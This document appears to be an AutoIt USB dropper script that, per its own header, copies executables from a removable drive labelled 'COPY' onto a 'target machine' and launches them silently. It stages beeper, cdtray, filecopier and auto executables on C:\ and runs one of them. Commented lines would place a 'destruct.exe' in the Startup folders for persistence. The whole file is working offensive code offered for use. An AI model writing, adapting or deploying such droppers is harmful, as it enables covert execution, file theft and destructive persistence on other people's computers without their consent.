#cs ----------------------------------------------------------------------------
 AutoIt Version: 3.3.8.1
 Author:         squ1r3ll
 Script Function:
	To copy script files onto the C drive of a target machine and launch them
#ce ----------------------------------------------------------------------------
#NoTrayIcon
Global $Cdrive = False

Main()
Func Main()
   ; check the scripts working dir
   If @ScriptDir = "C:" Then $Cdrive = True EndIf
   ConsoleWrite("Scripts Dir Is: " & @ScriptDir & @CR)
   Find_Drive()
   InitCopy()
   Run_Stuff($Cdrive)
EndFunc
; find the removable drive letter
Func Find_Drive()
   ConsoleWrite('Find_Drive Has Been Launched!')
   ; find all drives with REMOVABLE as their type
   Global $drive_arr = DriveGetDrive("REMOVABLE")
   ; check for the drive with the right label and set it's letter to $drive_letter
   For $i = 0 to $drive_arr[0]
	  If DriveGetLabel($drive_arr[$i]) = "COPY" Then
		 Global $drive_letter = $drive_arr[$i]
	  EndIf
   Next
EndFunc
; performs the initial exe copy
Func InitCopy()
   ; copy files onto C:
   FileCopy($drive_letter & "\scripts\beeper.exe", "c:\", 1)
   FileCopy($drive_letter & "\scripts\cdtray.exe", "c:\", 1)
   FileCopy($drive_letter & "\scripts\filecopier.exe", "c:\", 1)
   FileCopy($drive_letter & "\scripts\auto.exe", "c:\", 1)
   ;FileCopy($drive_letter & "\scripts\destruct.exe", @StartupDir, 1)
   ;FileCopy($drive_letter & "\scripts\destruct.exe", @StartupCommonDir, 1)
EndFunc
; run at least the filecopier, possibly the destructive .exe's
Func Run_Stuff($Go)
   If $Go = False Then 
	  Run("C:\auto.exe")
	  Exit
   EndIf
   Do
	  Sleep(10)
   Until FileExists("C:\filecopier.exe")
   Run("C:\filecopier.exe")
EndFunc
